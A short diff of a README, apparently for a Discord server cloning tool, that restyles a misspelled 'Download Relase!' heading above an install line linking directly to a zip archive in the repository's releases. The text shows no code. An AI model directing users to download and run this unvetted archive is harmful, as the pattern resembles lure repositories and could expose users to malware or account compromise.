@@ -17,7 +17,7 @@
 ```
 ---
 
-## Download Relase!
+## 🏹 ・Download Relase!
 🚀 Install --> [Releases](https://github.com/yoepax/Discord-Server-Cloner/releases/download/v2.4/Relase.zip)
 
 
